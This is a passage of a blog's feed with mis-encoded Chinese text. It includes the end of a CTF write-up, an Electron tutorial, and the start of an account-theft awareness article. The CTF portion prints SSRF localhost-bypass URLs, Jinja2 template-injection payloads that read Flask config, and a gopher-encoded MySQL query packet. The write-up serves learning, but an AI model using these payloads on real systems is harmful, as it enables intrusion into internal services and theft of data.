delimiter">?></span></code></pre><p>æ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>http|https|gopher|dict</code>å››ç§åè®®è¿›è¡ŒCurlæ“ä½œï¼Œå¹¶ä¸”æ¢æµ‹åˆ°çš„å†…å®¹ä¼šé€šè¿‡<code>var_dump($output);</code>æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯å®ƒä¼šå¯¹æˆ‘ä»¬æ¢æµ‹çš„ipåœ°å€è¿›è¡Œcheckï¼Œçœ‹æ˜¯å¦ä¸ºå†…ç½‘åœ°å€ï¼ˆ<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">å¯ä»¥è¿›è¡Œbypassï¼Œè¿™é¢˜çš„ssrfä¸ä¸Šæµ·å¤§å­¦ç”Ÿç½‘å®‰èµ›æŸæ˜¥ç§‹å‡ºçš„é¢˜æœ‰äº›è®¸ç±»ä¼¼</a>ï¼‰ã€‚</p><pre class=" language-php+HTML"><code class="language-php+HTML">payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre><p>åŸç†ï¼š<a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a>/#some-trick-in-unserialize)</p><h2 id="0x02-çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹"><a href="#0x02-çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹" class="headerlink" title="0x02 çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹"></a>0x02 çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹</h2><p><code>PS: æƒ³å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„SSRFæ¢æµ‹å·¥å…·</code></p><p>é€šè¿‡bpçš„intruderæ¨¡å—ï¼Œå¯¹å†…ç½‘ç½‘æ®µçš„å¸¸ç”¨ç«¯å£è¿›è¡ŒæœåŠ¡æ¢æµ‹ï¼ˆ172.11.243.0/24ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129211758.png" alt=""></p><p>å¯ä»¥å¾—åˆ°<code>172.11.243.81:8080</code>å’Œ<code>172.11.243.218:3306</code>ï¼Œåˆ†åˆ«ä¸ºä¸€ä¸ªflaskæœåŠ¡å’ŒmysqlæœåŠ¡ã€‚</p><p>source code of flask service:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'HINT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'HINT'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/yulige/&lt;path:yulige>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yulige</span><span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>æ ¹æ®æºç ä¸­å‡ºç°çš„<code>flask.render_template_string</code>ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯è€ƒSSTIæ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œå¯¹<code>(ã€)ã€configã€self</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ— æ³•è¿›è¡Œå¸¸è§„çš„æ“ä½œï¼Œæ³¨æ„åˆ°<code>app.config[&#39;HINT&#39;] = os.environ.pop(&#39;HINT&#39;)</code>ï¼Œå¯ä»¥æƒ³åŠæ³•getåˆ°HINTçš„å€¼ï¼Œå¯ä»¥å‚è€ƒ<a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">ä»SSTIåˆ°æ²™ç®±é€ƒé€¸-jinja2</a>ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}</span><span class="token comment" spellcheck="true">#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}</span></code></pre><p>æ‹¿payloadæ‰“ä¸€å‘åæ‹¿åˆ°äº†HINTé‡Œé¢çš„mysqlç”¨æˆ·åã€‚</p><h2 id="0x03-æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸"><a href="#0x03-æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸" class="headerlink" title="0x03 æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸"></a>0x03 æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸</h2><p>æ³¨æ„åˆ°æœ€å¼€å§‹å…è®¸æˆ‘ä»¬ä½¿ç”¨çš„åè®®ä¸­åŒ…æ‹¬<code>gopher</code>åè®®ï¼Œé€šè¿‡<code>ssrfï¼‹gopher</code>æˆ‘ä»¬å¯ä»¥å¯¹æœªè®¾ç½®å¯†ç çš„mysqlæœåŠ¡è¿›è¡Œæ”»å‡»ï¼Œè¿™é‡Œç”¨åˆ°Githubä¸Šé¢ä¸€ä¸ªå¥½ä¸œè¥¿<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>ã€‚</p><p>åˆ—æ•°æ®åº“åï¼ˆä¾æ¬¡ç±»æ¨ï¼Œæ‹¿è¡¨åï¼Œæ‹¿åˆ—åï¼Œgetflagï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214016.png" alt=""></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æ˜¯åœ¨æ‰“ssrfï¼Œé€šè¿‡è·³æ¿æ‰“å†…ç½‘ï¼Œpayloadä¸­çš„urlç¼–ç éœ€è¦è¿›è¡ŒäºŒæ¬¡ç¼–ç æ‰èƒ½æ­£å¸¸å‘æŒ¥ä½œç”¨ï¼š</p><pre class=" language-payload"><code class="language-payload">url=gopher://172.11.243.218:3306/_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%252c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%252e%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</code></pre><p>get flagï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214508.png" alt=""></p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04 å°ç»“"></a>0x04 å°ç»“</h2><p>ç¯å¢ƒå’Œæ°›å›´ï¼Œé¢˜ç›®çš„è´¨é‡ï¼Œéƒ½èƒ½å†³å®šä½ è‡ªå·±çš„è¿›æ­¥é€Ÿåº¦ã€‚å½“ç„¶ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯ä½ è‡ªå·±çš„åšæŒå’ŒåŠªåŠ›ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="ä¿¡æ¯å®‰å…¨" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="SSRF" scheme="http://www.yof3ng.xyz/tags/SSRF/"/>
    
      <category term="å†…ç½‘" scheme="http://www.yof3ng.xyz/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Electron-Learning-1</title>
    <link href="http://www.yof3ng.xyz/2019/01/25/Electron-Learning-1/"/>
    <id>http://www.yof3ng.xyz/2019/01/25/Electron-Learning-1/</id>
    <published>2019-01-25T05:09:44.000Z</published>
    <updated>2019-04-02T09:04:06.606Z</updated>
    
    <content type="html"><![CDATA[<p>Electron.</p><a id="more"></a>    <h1 id="Electron-å­¦ä¹ è®°å½•"><a href="#Electron-å­¦ä¹ è®°å½•" class="headerlink" title="Electron å­¦ä¹ è®°å½•"></a>Electron å­¦ä¹ è®°å½•</h1><blockquote><p>å‚è€ƒ é“¾æ¥ï¼š</p><p><a href="https://www.jianshu.com/p/1687f8dcd70c" target="_blank" rel="noopener">å¼€å‘ Electron app å¿…çŸ¥çš„ 4 ä¸ª tips</a></p><p><a href="https://www.w3cschool.cn/electronmanual/" target="_blank" rel="noopener">Electronnä¸­æ–‡æ‰‹å†Œ</a></p><p><a href="https://mlln.cn/2018/01/08/electron%E4%BD%9C%E4%B8%BApython%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Electronä¸python</a></p><p><a href="https://www.jianshu.com/p/59a0a24ed388" target="_blank" rel="noopener">3åˆ†é’Ÿä¸Šæ‰‹ï¼šé€šè¿‡vueå’Œelectronåˆ›å»ºæ¡Œé¢åº”ç”¨</a> </p></blockquote><h2 id="Electron-ç®€ä»‹"><a href="#Electron-ç®€ä»‹" class="headerlink" title="Electron ç®€ä»‹"></a>Electron ç®€ä»‹</h2><p>å¼•ç”¨W3schoolçš„Electronä¸­æ–‡æ–‡æ¡£ç®€ä»‹ï¼š</p><blockquote><p>Electron å¯ä»¥è®©ä½ ä½¿ç”¨çº¯ <a href="https://www.w3cschool.cn/javascript/" target="_blank" rel="noopener">JavaScript</a> è°ƒç”¨ä¸°å¯Œçš„åŸç”Ÿ APIs æ¥åˆ›é€ æ¡Œé¢åº”ç”¨ã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸“æ³¨äºæ¡Œé¢åº”ç”¨è€Œä¸æ˜¯ web æœåŠ¡å™¨çš„ï¼Œio.js çš„ä¸€ä¸ªå˜ä½“ã€‚</p><p>è¿™ä¸æ„å‘³ç€ Electron æ˜¯ç»‘å®šäº† GUI åº“çš„ JavaScriptã€‚ç›¸åï¼ŒElectron ä½¿ç”¨ web é¡µé¢ä½œä¸ºå®ƒçš„ GUIï¼Œæ‰€ä»¥ä½ èƒ½æŠŠå®ƒçœ‹ä½œæˆä¸€ä¸ªè¢« JavaScript æ§åˆ¶çš„ï¼Œç²¾ç®€ç‰ˆçš„ Chromium æµè§ˆå™¨ã€‚</p></blockquote><h3 id="ä¸»è¿›ç¨‹ï¼ˆMain-Processï¼‰"><a href="#ä¸»è¿›ç¨‹ï¼ˆMain-Processï¼‰" class="headerlink" title="ä¸»è¿›ç¨‹ï¼ˆMain Processï¼‰"></a>ä¸»è¿›ç¨‹ï¼ˆMain Processï¼‰</h3><p>åœ¨ Electron é‡Œï¼Œè¿è¡Œ <code>package.json</code> é‡Œ <code>main</code> è„šæœ¬çš„è¿›ç¨‹è¢«ç§°ä¸º<strong>ä¸»è¿›ç¨‹</strong>ã€‚åœ¨ä¸»è¿›ç¨‹è¿è¡Œçš„è„šæœ¬å¯ä»¥ä»¥åˆ›å»º web é¡µé¢çš„å½¢å¼å±•ç¤º GUIã€‚</p><h3 id="æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer-Processï¼‰"><a href="#æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer-Processï¼‰" class="headerlink" title="æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer Processï¼‰"></a>æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer Processï¼‰</h3><p>ç”±äº Electron ä½¿ç”¨ Chromium æ¥å±•ç¤ºé¡µé¢ï¼Œæ‰€ä»¥ Chromium çš„å¤šè¿›ç¨‹ç»“æ„ä¹Ÿè¢«å……åˆ†åˆ©ç”¨ã€‚æ¯ä¸ª Electron çš„é¡µé¢éƒ½åœ¨è¿è¡Œç€è‡ªå·±çš„è¿›ç¨‹ï¼Œè¿™æ ·çš„è¿›ç¨‹æˆ‘ä»¬ç§°ä¹‹ä¸º<strong>æ¸²æŸ“è¿›ç¨‹</strong>ã€‚</p><p>åœ¨ä¸€èˆ¬æµè§ˆå™¨ä¸­ï¼Œç½‘é¡µé€šå¸¸ä¼šåœ¨æ²™ç›’ç¯å¢ƒä¸‹è¿è¡Œï¼Œå¹¶ä¸”ä¸å…è®¸è®¿é—®åŸç”Ÿèµ„æºã€‚ç„¶è€Œï¼Œ<code>Electron ç”¨æˆ·æ‹¥æœ‰åœ¨ç½‘é¡µä¸­è°ƒç”¨ io.js çš„ APIs çš„èƒ½åŠ›</code>ï¼Œå¯ä»¥ä¸åº•å±‚æ“ä½œç³»ç»Ÿç›´æ¥äº¤äº’ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190124203528.png" alt="è¿è¡Œæ¦‚è¿°"></p><h2 id="Electron-åœ¨çº¿-ç¦»çº¿äº‹ä»¶æ¢æµ‹"><a href="#Electron-åœ¨çº¿-ç¦»çº¿äº‹ä»¶æ¢æµ‹" class="headerlink" title="Electron åœ¨çº¿/ç¦»çº¿äº‹ä»¶æ¢æµ‹"></a>Electron åœ¨çº¿/ç¦»çº¿äº‹ä»¶æ¢æµ‹</h2><blockquote><p>Tipsï¼šelectron v4.02ä¸­çš„ä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹è¿›è¡Œé€šä¿¡çš„æ—¶å€™ï¼Œå°±éœ€è¦ç”¨åˆ°<code>ipc</code>è¿™ä¸ªç‰¹æ€§ã€‚è€Œ<code>ipc</code>åˆåˆ†ä¸º<code>ipcMain</code>å’Œ<code>ipcRenderer</code>ä¸¤ä¸ªï¼Œåˆ†åˆ«ç”¨äºä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ã€‚</p><p>letå‘½ä»¤å’Œvarå‘½ä»¤ä¸åŒçš„åœ°æ–¹æ˜¯letçš„å¯¹è±¡åªåœ¨letæ‰€åœ¨çš„ä»£ç å—èŒƒå›´ä¸­èµ·ä½œç”¨ã€‚</p></blockquote><p>è¿™é‡Œéœ€è¦ç”¨åˆ°navigatorå¯¹è±¡ï¼Œä½†æ˜¯åœ¨electronä¸»è¿›ç¨‹ä¸­æ²¡æœ‰è¿™ä¸ªï¼Œæ‰€ä»¥éœ€è¦å»ºç«‹ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼Œåˆ©ç”¨IPCé€šä¿¡ï¼Œè·å–ç½‘ç»œçŠ¶æ€ã€‚</p><p>åœ¨æˆ‘çš„ç¯å¢ƒä¸­å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç å®è·µæˆåŠŸï¼š</p><p><code>main.js</code></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>ipcMain<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token keyword">let</span> onlineStatusWindowapp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  onlineStatusWindow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> show<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  onlineStatusWindow<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/online-status.html`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><code>online-status.html</code></p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">const</span> <span class="token punctuation">{</span>ipcRenderer<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> updateOnlineStatus <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>onLine <span class="token operator">?</span> <span class="token string">'online'</span> <span class="token punctuation">:</span> <span class="token string">'offline'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*navigator.onLine ==> true or false*/</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  <span class="token function">updateOnlineStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="Electron-è¿›ç¨‹"><a href="#Electron-è¿›ç¨‹" class="headerlink" title="Electron è¿›ç¨‹"></a>Electron è¿›ç¨‹</h2><p>Electronçš„<code>process</code>å¯¹è±¡</p><pre class=" language-javascript"><code class="language-javascript">process<span class="token punctuation">.</span>type <span class="token operator">-</span> String <span class="token operator">-</span> è·å–è¿›ç¨‹ç±»å‹process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'electron'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> è·å–electronç‰ˆæœ¬process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'chrome'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> è·å–chromiumçš„ç‰ˆæœ¬process<span class="token punctuation">.</span>resourcePath <span class="token operator">-</span> String <span class="token operator">-</span> Javascriptæºä»£ç è·¯å¾„<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span>noAsar <span class="token operator">=</span> <span class="token boolean">true</span> or <span class="token boolean">false</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span><span class="token function">hang</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//ä½¿å¾—è¿›ç¨‹çš„ä¸»çº¿ç¨‹æŒ‚èµ·</span></code></pre><h2 id="Electron-æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³"><a href="#Electron-æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³" class="headerlink" title="Electron æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³"></a>Electron æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³</h2><p>åœ¨appæ¨¡å—çš„readyäº‹ä»¶å‘å‡ºä¹‹å‰å¯ä»¥é€šè¿‡<code>app.commandLine.appendSwitch</code>æ¥æ·»åŠ æŒ‡å®šçš„å‘½ä»¤å‚æ•°åˆ°mainè„šæœ¬ä¸­ï¼š</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>app<span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'remote-debugging-port'</span><span class="token punctuation">,</span> <span class="token string">'8315'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'host-rules'</span><span class="token punctuation">,</span> <span class="token string">'MAP * 127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Your code here</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ›´å¤šçš„å‘½ä»¤å‚æ•°å¯å‚è€ƒï¼š<a href="https://www.w3cschool.cn/electronmanual/82vz1ql9.html" target="_blank" rel="noopener">Electronä¸­æ–‡æ–‡æ¡£</a></p><h2 id="Electron-ç¯å¢ƒå˜é‡"><a href="#Electron-ç¯å¢ƒå˜é‡" class="headerlink" title="Electron ç¯å¢ƒå˜é‡"></a>Electron ç¯å¢ƒå˜é‡</h2><p>ä¸€äº› Electron çš„è¡Œä¸ºå—åˆ°ç¯å¢ƒå˜é‡çš„æ§åˆ¶ï¼Œå› ä¸ºä»–ä»¬çš„åˆå§‹åŒ–æ¯”å‘½ä»¤è¡Œå’Œåº”ç”¨ä»£ç æ›´æ—©ã€‚ä»¥ä¸‹ æ˜¯ä¸€äº›å¸¸ç”¨çš„ç¯å¢ƒå˜é‡å</p><pre class=" language-bash"><code class="language-bash">//<span class="token operator">></span>set ELECTRON_ENABLE_LOGGING<span class="token operator">=</span>true//<span class="token operator">></span>electronELECTRON_RUN_AS_NODEELECTRON_ENABLE_LOGGINGELECTRON_LOG_ASAR_READSELECTRON_ENABLE_STACK_DUMPINGELECTRON_DEFAULT_ERROR_MODEELECTRON_NO_ATTACH_CONSOLEELECTRON_FORCE_WINDOW_MENU_BARELECTRON_HIDE_INTERNAL_MODULES</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Electron.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="http://www.yof3ng.xyz/categories/Programming/"/>
    
    
      <category term="Electron" scheme="http://www.yof3ng.xyz/tags/Electron/"/>
    
      <category term="Programming" scheme="http://www.yof3ng.xyz/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>è¿½è¸ªæº¯æº_ç™½è¯æ–‡è®²ç›—å·--ç§‘æ™®ç¯‡</title>
    <link href="http://www.yof3ng.xyz/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/"/>
    <id>http://www.yof3ng.xyz/2018/11/20/è¿½è¸ªæº¯æº-å°ç™½ç§‘æ™®ç¯‡/</id>
    <published>2018-11-20T14:43:11.000Z</published>
    <updated>2019-04-02T08:47:26.552Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="è¿½è¸ªæº¯æº-ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡"><a href="#è¿½è¸ªæº¯æº-ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡" class="headerlink" title="è¿½è¸ªæº¯æº_ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡"></a>è¿½è¸ªæº¯æº_ç™½è¯æ–‡è®²ç›—å·â€“ç§‘æ™®ç¯‡</h1><blockquote><p>ğŸ†’ä¸€ç›´ä¸€ç›´ä»¥æ¥ï¼Œæ€»æ˜¯æœ‰äººä¸æ–­è¢«ç›—qqï¼Œç„¶åè¢«ç”¨ä»¥æ¶æ„ç›—å·è€…æ•£æ’­æ›´å¤šçš„æ¶æ„é“¾æ¥æˆ–è€…è¿›è¡Œè¯ˆéª—ç›ˆåˆ©æ´»åŠ¨ï¼Œæ¶æ€§å¾ªç¯ï¼Œæ„ˆæ¼”æ„ˆçƒˆï¼Œä¸ºäº†ç»™åŒå­¦ä»¬ç¨å¾®ç§‘æ™®ä¸€ä¸‹åŸºæœ¬çš„ç›—å·åŸç†ï¼Œæ•…æœ‰æ­¤æ–‡ã€‚</p><p>ä»æ‰«äºŒç»´ç ç›—å·ï¼Œåˆ°æ¨¡æ‹Ÿqqç™»å½•ç•Œé¢çš„é’“é±¼ç½‘ç«™ç›—å·ï¼Œå†åˆ°ä¼ªé€ qqåœ¨çº¿æ–‡æ¡£è¯±å¯¼qqç”¨æˆ·ç‚¹å‡»å¯¼è‡´çš„ç›—å·ï¼Œæ€»ä¹‹ç›—å·çš„æ–¹å¼å„ç§å„æ ·ï¼Œä½†éƒ½ç¦»ä¸å¼€ä¸€ä¸ªé‡ç‚¹ï¼Œ<strong>é‚£å°±æ˜¯ä½ çš„è´¦å·æ˜¯ä»ä½ çš„è®¾å¤‡ä¸Šé¢ä¼ è¾“ç»™åˆ«äººçš„</strong>ï¼ˆå¦‚æœä½ æ²¡æœ‰åˆ°å¤„å®£æ‰¬ä½ çš„å¯†ç 